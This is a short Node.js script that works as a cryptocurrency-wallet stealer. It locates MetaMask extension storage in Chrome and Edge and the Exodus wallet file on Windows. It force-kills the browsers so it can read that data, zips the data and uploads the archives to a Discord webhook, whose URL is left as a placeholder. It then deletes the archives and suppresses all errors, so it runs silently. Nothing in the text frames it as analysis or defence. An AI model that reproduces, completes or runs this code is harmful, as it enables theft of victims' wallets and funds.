import kill from 'fkill';
import os from 'os';
import AdmZip from 'adm-zip';
import { Webhook } from 'discord-webhook-node';
import fs from 'fs';


const user = os.userInfo().username;

const metamask_paths = [
    {
        name: 'MMChrome1',
        path: `C:-Users-${user}-AppData-Local-Google-Chrome-User Data-Default-Local Extension Settings-nkbihfbeogaeaoehlefnkodbefgpgknn`
    },
    {
        name: 'MMChrome2',
        path: `C:-Users-${user}-AppData-Local-Google-Chrome-User Data-Default-Local Extension Settings-ejbalbakoplchlghecdalmeeeajnimhm`
    },
    {
        name: 'MMEdge1',
        path: `C:-Users-${user}-AppData-Local-Microsoft-Edge-User Data-Default-Local Extension Settings-ejbalbakoplchlghecdalmeeeajnimhm`
    },
    {
        name: 'MMEdge2',
        path: `C:-Users-${user}-AppData-Local-Microsoft-Edge-User Data-Default-Local Extension Settings-nkbihfbeogaeaoehlefnkodbefgpgknn`
    }
];

const exodus_paths = [
    {
        name: 'Exodus',
        path: `C:-Users-${user}-AppData-Roaming-Exodus-exodus.wallet`
    }
]
let prod_hook = 'WEBHOOK';
const hook = new Webhook(prod_hook);

async function hack(paths) {
    try {
        paths.forEach(async function({path, name}) {
            try {
                path = path.split('-').join(`\\`);
                if (!fs.existsSync(path)) return;
                if (name === 'MMChrome1' || name === 'MMChrome2') {
                    await kill('chrome.exe', { force: true });
                }
                if (name === 'MMEdge1' || name === 'MMEdge2') {
                    await kill('msedge.exe', { force: true })
                }
                const zip = new AdmZip();
                zip.addLocalFolder(path);
                zip.writeZip(name + '.zip');
                await hook.sendFile(name + '.zip');
                fs.unlinkSync('./' + name + '.zip');
            } catch(e) {
                
            }
        });
    } catch(e) {
        
    }
}

hack(metamask_paths);
hack(exodus_paths);


